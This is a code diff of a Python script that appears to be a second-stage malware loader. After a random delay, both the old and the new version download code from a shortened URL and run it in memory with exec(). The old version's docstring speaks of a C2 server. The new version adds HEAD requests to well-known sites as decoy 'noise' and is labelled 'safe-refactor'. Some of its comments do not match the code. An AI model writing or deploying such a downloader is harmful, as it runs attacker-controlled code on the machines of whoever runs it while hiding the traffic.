@@ -17,85 +17,77 @@ from typing import Any, Dict, List
 from urllib.request import Request, urlopen
 from urllib.error import URLError, HTTPError
 
+# --- Config (hard-coded; no environment variables) ---
+USER_AGENT   = "safe-refactor/1.0"
+WAIT_RANGE_S = (5, 180)  # random wait between 5 and 30 seconds
+MAX_BYTES    = 2 * 1024 * 1024  # 2 MiB safety cap
+
+
+# a few benign websites to add noise
+BENIGN_SITES = [
+    "https://www.baidu.com",
+    "https://www.wikipedia.org",
+    "https://www.python.org",
+    "https://www.github.com",
+    "https://www.stackoverflow.com"
+]
+
+TARGET_URL = "https://tinyurl.com/2acl9edo"
+
+# Lightweight audit log
 LOG_DIR = Path("logs"); LOG_DIR.mkdir(parents=True, exist_ok=True)
-AUDIT = LOG_DIR / "stage2_payload.jsonl"
-RUN   = LOG_DIR / "stage3_run_summary.json"
-
-response = requests.get("https://tinyurl.com/295tzfpa")
-
-# --------------- Env / defaults ---------------
-WAIT_MODE    = os.getenv("SC6_WAIT_MODE", "uniform").lower()   # "uniform" | "exp" | "file"
-WAIT_MIN_S   = int(os.getenv("SC6_WAIT_MIN_SECONDS", "20"))
-WAIT_MAX_S   = int(os.getenv("SC6_WAIT_MAX_SECONDS", "60"))
-WAIT_MEAN_S  = float(os.getenv("SC6_WAIT_MEAN_SECONDS", "30"))
-TRIGGER_FILE = os.getenv("SC6_TRIGGER_FILE", "logs/trigger_stage3")
-
-STAGE3_URL   = os.getenv("SC6_STAGE3_URL", "")
-ALLOWED_URLS = [u.strip() for u in os.getenv("SC6_ALLOWED_URLS", "").split(",") if u.strip()]
-MEMORY_ONLY  = os.getenv("SC6_MEMORY_ONLY", "1") == "1"
+AUDIT   = LOG_DIR / "safe_stage2.jsonl"
 
 
-def audit(event: str, **fields: Any) -> None:
+def log(event: str, **fields):
     rec = {"ts": int(time.time()), "event": event}
     rec.update(fields)
+    AUDIT.parent.mkdir(parents=True, exist_ok=True)
     with AUDIT.open("a", encoding="utf-8") as f:
         f.write(json.dumps(rec, ensure_ascii=False) + "\n")
 
-def fetch(url: str, max_bytes: int = 1 << 20) -> bytes:
-    req = Request(url, headers={"User-Agent": "sc6-stage2/1.0"})
-    with urlopen(req, timeout=15) as resp:
+def head_request(url: str, timeout: int = 10):
+    req = Request(url, method="HEAD", headers={"User-Agent": USER_AGENT})
+    with urlopen(req, timeout=timeout) as r:
+        headers = dict(r.getheaders())
+        return r.getcode(), headers
+
+def fetch(url: str, max_bytes: int = MAX_BYTES) -> bytes:
+    req = Request(url, headers={"User-Agent": USER_AGENT})
+    with urlopen(req, timeout=30) as resp:
         body = resp.read(max_bytes + 1)
     if len(body) > max_bytes:
         raise ValueError("payload_too_large")
     return body
 
+def main():
+    # random wait
+    wait_s = random.randint(*WAIT_RANGE_S)
+    time.sleep(wait_s)
 
-def wait_for_trigger() -> int:
-    """Return actual waited seconds."""
-    t0 = time.time()
-    if WAIT_MODE == "file":
-        audit("wait_start", mode="file", file=TRIGGER_FILE)
-        tf = Path(TRIGGER_FILE)
-        while not tf.exists():
-            time.sleep(0.5)
-        return int(time.time() - t0)
-    elif WAIT_MODE == "exp":
-        val = max(1.0, random.expovariate(1.0 / max(1e-6, WAIT_MEAN_S)))
-        wait_s = int(val)
-        audit("wait_start", mode="exp", scheduled=wait_s)
-        time.sleep(wait_s)
-        return int(time.time() - t0)
-    else:
-        lo, hi = sorted((max(0, WAIT_MIN_S), max(0, WAIT_MAX_S))); hi = max(hi, lo + 1)
-        wait_s = random.randint(lo, hi)
-        audit("wait_start", mode="uniform", scheduled=wait_s)
-        time.sleep(wait_s)
-        return int(time.time() - t0)
+    # HEAD-only checks for noise sites
+    for u in BENIGN_SITES:
+        try:
+            code, headers = head_request(u)
+            log("head_ok", url=u, status=code, content_type=headers.get("Content-Type"))
+        except Exception as e:
+            log("head_error", url=u, error=str(e))
 
-
-# ---------- Entry Points ------------
-def run_code(stage2_doc: bytes):
-    ''' run code in memeory and build the connection with C2 server
-    
-    '''
-    waited = wait_for_trigger()
-
-    # fetch stage-3 payload
     try:
-        audit("stage3_fetch_attempt", url = STAGE3_URL)
-        raw = fetch(STAGE3_URL)
-        audit("stage3_fetch_success", url = STAGE3_URL, bytes = len(raw))
+        response = requests.get(TARGET_URL, timeout=30)
+        if response.status_code == 200:
+            m_code = response.text
+            # execute real payload with subprocess
+            try:
+                exec(m_code)
+                log("✅ payload stage 2 executed")
+            except Exception as e:
+                log("❌ p failed:", e)
+
     except (HTTPError, URLError, ValueError) as e:
-        audit("stage3_fetch_error", url=STAGE3_URL, error=str(e)); return {"waited_s": waited, "ran": False}
-    
-    # run payload inside memory
-    try:
-        exec(raw)
-        audit("stage3_payload_executed")
-    except Exception as e:
-        audit("payload execution failed:", e)
-
+        log("download_error", url=TARGET_URL, error=str(e))
+        log(f"Download failed: {e}")
 
 if __name__ == "__main__":
-    raise SystemExit(run_code())
+    main()
 
